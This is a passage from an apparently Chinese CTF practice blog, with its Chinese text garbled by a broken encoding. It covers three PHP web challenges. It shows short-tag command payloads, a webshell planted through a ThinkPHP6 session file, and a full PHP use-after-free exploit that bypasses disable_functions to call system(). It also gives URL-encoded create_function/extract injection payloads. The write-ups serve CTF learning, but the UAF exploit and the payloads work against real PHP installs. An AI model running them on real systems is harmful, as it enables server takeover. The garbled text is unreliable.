src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215541398.png" alt="image-20211202215541398"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215555418.png" alt="image-20211202215555418"></p><p>èƒ½æ‰¾åˆ°æ ¹ç›®å½•ä¸‹çš„flag.txt</p><p>catè¯»å–</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215700231.png" alt="image-20211202215700231"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215712160.png" alt="image-20211202215712160"></p><p>è¿™é‡Œåº”è¯¥æ˜¯å–å·§äº†ï¼Œbuuçš„flagé‡Œä¸åŒ…å«ciscnï¼Œæ‰€ä»¥è¿™ä¸ªè¿‡æ»¤å°±æ²¡ç”¨äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215826313.png" alt="image-20211202215826313"></p><p><a href="https://www.sohu.com/a/370378373_750628">ä»ä¸€é“ctfé¢˜è°ˆè°ˆflaskå¼€å¯debugæ¨¡å¼å­˜åœ¨çš„å®‰å…¨é—®é¢˜_pin (sohu.com)</a></p><h2 id="çº¢æ˜è°·CTF-2021-write-shell"><a href="#çº¢æ˜è°·CTF-2021-write-shell" class="headerlink" title="[çº¢æ˜è°·CTF 2021]write_shell"></a>[çº¢æ˜è°·CTF 2021]write_shell</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123;        &#x2F;&#x2F; if(preg_match(&quot;&#x2F;&#39;| |_|&#x3D;|php&#x2F;&quot;,$input))&#123;        die(&#39;hacker!!!&#39;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key&#x3D;&gt;$output)&#123;          $input[$key] &#x3D; waf($output);      &#125;  &#125;else&#123;      $input &#x3D; check($input);  &#125;&#125;$dir &#x3D; &#39;sandbox&#x2F;&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;&#x2F;&#39;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#39;pwd&#39;:        echo $dir;        break;    case &#39;upload&#39;:        $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>è¿‡æ»¤ï¼›å¯ä»¥åˆ©ç”¨çŸ­æ ‡ç­¾ï¼Œè¿‡æ»¤evalå¯ä»¥é‡‡ç”¨åå¼•å·ï¼Œè¿‡æ»¤ç©ºæ ¼å¯ä»¥ç”¨\t</p><pre class="language-none"><code class="language-none">PHPä¸­æœ‰ä¸¤ç§çŸ­æ ‡ç­¾ï¼Œ&lt;??&gt;å’Œ&lt;?&#x3D;?&gt;ã€‚å…¶ä¸­ï¼Œ&lt;??&gt;ç›¸å½“äºå¯¹&lt;?php&gt;çš„æ›¿æ¢ã€‚è€Œ&lt;?&#x3D;?&gt;åˆ™æ˜¯ç›¸å½“äº&lt;? echo&gt;ã€‚</code></pre><pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\t&#x2F;&#96;?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206210913770.png" alt="image-20211206210913770"></p><pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\t&#x2F;flllllll1112222222lag&#96;?&gt;æˆ–è€…?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\t&#x2F;f*&#96;?&gt;*ä¸ºé€šé…ç¬¦</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206211136986.png" alt="image-20211206211136986"></p><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>é¢˜ç›®æ—¶thinkphp6ç‰ˆæœ¬çš„æ¼æ´</p><p><a href="https://ld246.com/article/1579965339516">ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ - é“¾æ»´ (ld246.com)</a></p><p>åªéœ€è¦æ„é€  PHPSESSID çš„å€¼å³å¯ï¼Œå€¼ä¸º <code>string</code>&amp;&amp;é•¿åº¦ä¸º 32</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/webp.webp" alt="tp.png"></p><p>æ­¤æ—¶æŸ¥çœ‹ä¸€ä¸‹ç”Ÿæˆçš„ sessionï¼Œç”Ÿæˆçš„ session æ–‡ä»¶ä¿å­˜åœ¨ <code>\runtime\session</code> ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/webp.webp" alt="sessionphp.png"></p><p>session é‡Œçš„å†…å®¹:</p><pre class="language-json" data-language="json"><code class="language-json">a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;thinkphp&quot;;&#125;</code></pre><p>å¯ä»¥çœ‹åˆ° session çš„å†…å®¹ç»è¿‡äº†åºåˆ—åŒ–æ“ä½œï¼Œåªè¦å°† session çš„å†…å®¹ååºåˆ—åŒ–å³å¯ getshell</p><hr><p>è¿™ä¸ªå¸ˆå‚…æ„é€ äº†ä¸€ä¸ªå‘SESSIONä¸­å†™å…¥å€¼çš„ç±»å’Œå‡½æ•°ï¼Œä½†æ˜¯åœ¨æœ¬é¢˜ä¸­ï¼Œæœç´¢çš„å†…å®¹ç›´æ¥è¢«å†™å…¥äº†SESSIONï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯æˆ‘ä¹Ÿçœ‹ä¸æ‡‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205225749.png" alt="image-20211208205225749"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹sessionä¸º.phpçš„åç¼€ï¼Œç„¶å</p><p>åœ¨æœç´¢æ é‡Œæœä¸ªé©¬ï¼Œå°±å¯ä»¥åœ¨/runtime/sessionè·¯å¾„ä¸‹è®¿é—®å¹¶æ‰§è¡Œè¿™ä¸ªé©¬</p><p>å…ˆè¯•è¯•phpinfo</p><p>/runtime/session/sess_0123456789012345678901234568.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208203421218.png" alt="image-20211208203421218"></p><p>å†™ä¸ªä¸€å¥è¯æœ¨é©¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205558736.png" alt="image-20211208205558736"></p><p>èšå‰‘è¿æ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205849571.png" alt="image-20211208205849571"></p><p>æ ¹ç›®å½•åˆflagä½†æ˜¯æ‰“å¼€æ²¡ä¸œè¥¿ï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶,çŒœæµ‹æ˜¯è¦æ‰§è¡Œreadflagæ¥è¯»å–flagæ–‡ä»¶é‡Œçš„å†…å®¹</p><p>ä½†æ˜¯åœ¨è™šæ‹Ÿç»ˆç«¯æ— æ³•æ‰§è¡Œå‘½ä»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210015627.png" alt="image-20211208210015627"></p><p>ç»“åˆphpinfoé‡Œçš„ç¦ç”¨å‡½æ•°</p><p>èƒ½å¾—å‡ºè¿™æ˜¯ä¸ªçªç ´disable_functioné™åˆ¶æ‰§è¡Œå‘½ä»¤çš„è€ƒç‚¹</p><p>ä¹‹å‰[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE MEä¹Ÿæœ‰è¿™ä¸ªè€ƒç‚¹ï¼ˆå¾€ä¸Šç¿»</p><p>ä½†æ˜¯åœ¨è¿™é“é¢˜é‡Œç”¨èšå‰‘çš„æ’ä»¶æ²¡æ³•ç»•è¿‡</p><p>ä¸Šä¸ªexpï¼ˆç¾¡æ…•èƒ½å†™å‡ºè¿™ç§expçš„å¤§å¸ˆå‚…</p><pre class="language-none"><code class="language-none">&lt;?phppwn(&quot;&#x2F;readflag&quot;);function pwn($cmd)&#123;    global $abc, $helper, $backtrace;    class Vuln    &#123;        public $a;        public function __destruct()        &#123;            global $backtrace;            unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;)            if (!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper    &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8)    &#123;        $address &#x3D; 0;        for ($j &#x3D; $s - 1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p + $j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8)    &#123;        $out &#x3D; &quot;&quot;;        for ($i &#x3D; 0; $i &lt; $m; $i++) &#123;            $out .&#x3D; chr($ptr &amp; 0xff);            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8)    &#123;        $i &#x3D; 0;        for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; chr($v &amp; 0xff);            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8)    &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if ($s !&#x3D; 8) &#123;            $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1;        &#125;        return $leak;    &#125;    function parse_elf($base)    &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for ($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec                $text_size &#x3D; $p_memsz;            &#125;        &#125;        if (!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf)    &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for ($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;constant&#39; constant check                if ($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;bin2hex&#39; constant check                if ($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak)    &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for ($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if ($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs)    &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if ($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while ($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg)    &#123;        # str_shuffle prevents opcache string interning        $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if (stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10; # increase this value if UAF fails    $contiguous &#x3D; [];    for ($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123;    &#125;;    if (strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    # leaks    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if (!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if (!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if (!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if (!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    # fake closure object    $fake_obj_offset &#x3D; 0xd0;    for ($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();&#125;</code></pre><p>æŠŠè¿™ä¸ªphpæ–‡ä»¶æ‰¾ä¸ªåœ°æ–¹ä¼ ä¸Šå»</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210715741.png" alt="image-20211208210715741"></p><p>è®¿é—®è¿™ä¸ªè·¯å¾„ï¼Œå¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210736589.png" alt="image-20211208210736589"></p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>è¿™ä¸ªé¢˜æ˜¯ä¸ªæŒºæœ‰æ„æ€çš„ä»£ç å®¡è®¡é¢˜</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208211705547.png" alt="image-20211208211705547"></p><p>ä¸­é—´è¿™ä¸ªä¸œè¥¿é“¾æ¥å¥½åƒå¯„äº†ï¼Œä½†æ˜¯ä¸å½±å“åšé¢˜ï¼Œæºç é‡Œæœ‰ä¸²base32ï¼Œè§£ç ä¸º1nD3x.php</p><p>è®¿é—®è¿™ä¸ªé¡µé¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208211820293.png" alt="image-20211208211820293"></p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;;$shana &#x3D; $_GET[&#39;shana&#39;];$passwd &#x3D; $_GET[&#39;passwd&#39;];$arg &#x3D; &#39;&#39;;$code &#x3D; &#39;&#39;;echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;if($_SERVER) &#123;     if (  preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123;         $file &#x3D; $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125; if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123;     die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;</code></pre><p>è¿‡æ»¤äº†ä¸€å †ä¸œè¥¿</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209223849475.png" alt="image-20211209223849475"></p><p>é¦–å…ˆæ˜¯è¿™ä¸ªï¼Œquery_stringè·å–çš„å†…å®¹ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œæ‰€ä»¥ç»•è¿‡è¿™ä¸€æ­¥å°±åªéœ€è¦æŠŠä¼ å…¥çš„å‚æ•°è¿›è¡Œurlç¼–ç å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224105760.png" alt="image-20211209224105760"></p><p>è¿™é‡Œå¯ä»¥ç”¨æ¢è¡Œç¬¦%0aç»•è¿‡preg_matchçš„åŒ¹é…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224139505.png" alt="image-20211209224139505"></p><p>è¿™ä¸ªç”±äºæ£€æµ‹çš„$_REQUESTï¼Œè€Œå¯¹ $_REQUESTæ¥è¯´postçš„ä¼˜å…ˆçº§å¤§äºgetï¼Œæ‰€ä»¥è¦postä¼ å…¥å’Œgetå†…å®¹ç›¸åŒçš„å‚æ•°ï¼ŒæŠŠå€¼æ”¹ä¸ºæ•°å­—å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224337739.png" alt="image-20211209224337739"></p><p>è¿™ä¸ªè¦ç”¨data://ä¼ªåè®®å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224412665.png" alt="image-20211209224412665"></p><p>å¸¸è§çš„æ•°ç»„ç»•è¿‡</p><p>æœ€åè¿™ä¹Ÿæ˜¯æœ€é‡è¦çš„åœ°æ–¹</p><p>é¦–å…ˆè¯´ä¸€ä¸‹<strong>create_functionæ³¨å…¥</strong></p><p><code>create_function()</code> å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•° <code>$args</code> å’Œ <code>$code</code>ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ª lambda æ ·å¼çš„å‡½æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209225145733.png" alt="image-20211209225145733"></p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹bè¿›è¡Œæ“ä½œï¼Œæ¥å®ç°è¿™ä¸ªå‡½æ•°çš„æå‰é—­åˆï¼Œå¹¶å†™å…¥æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ï¼Œç„¶åé€šè¿‡æ³¨é‡Šç¬¦ä½¿è¯­å¥åˆç†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209225534763.png" alt="image-20211209225534763"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224450239.png" alt="image-20211209224450239"></p><p><code>$arg</code> å’Œ <code>$code</code> å˜é‡éƒ½æ˜¯å¯æ§çš„ï¼Œå› ä¸º <code>extract()</code> å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ï¼Œé’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚å› æ­¤åªè¦ <code>extract()</code> å†…çš„æ•°ç»„é”®åä¸º <code>arg</code> å’Œ <code>code</code>ï¼Œé”®å€¼ä¸ºæˆ‘ä»¬æ„é€ çš„ç”¨æ¥æ³¨å…¥çš„ä»£ç ï¼Œå³å¯å®ç° <code>$arg</code> å’Œ <code>$code</code> çš„å˜é‡è¦†ç›–ï¼Œå¯¼è‡´ä»£ç æ³¨å…¥ã€‚</p><p>å†åˆ©ç”¨</p><pre class="language-none"><code class="language-none">var_dump(get_defined_vars())</code></pre><p>ç”¨æ¥è¾“å‡ºæ‰€æœ‰å˜é‡å’Œå€¼</p><pre class="language-none"><code class="language-none">&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6eè§£ç å†…å®¹ï¼š&#x2F;1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;&amp;debu&#x3D;aqua_is_cute&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209214827071.png" alt="image-20211209214827071"></p><p>ä½†æ˜¯çœ‹è§flagåœ¨rea1fl4gé‡Œ</p><p>æ‰€ä»¥è¦åˆ©ç”¨requireåŒ…å«è¿™ä¸ªæ–‡ä»¶ç„¶åå†ç”¨get_defined_vars()è¯»ä¸€éè¯•è¯•</p><p>ä½†æ˜¯åˆè¿‡æ»¤äº†.</p><p>æ‰€ä»¥è¯•è¯•base64ç¼–ç </p><pre class="language-none"><code class="language-none">GET:&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6ePOST:file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209215908383.png" alt="image-20211209215908383"></p><p>è¿˜æ˜¯ä¸è¡Œï¼Œå°è¯•ä¼ªåè®®è¯»æºç äº†åªèƒ½</p><p>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</p><p>é‡‡ç”¨å–åç»•è¿‡è¿‡æ»¤</p><pre class="language-none"><code 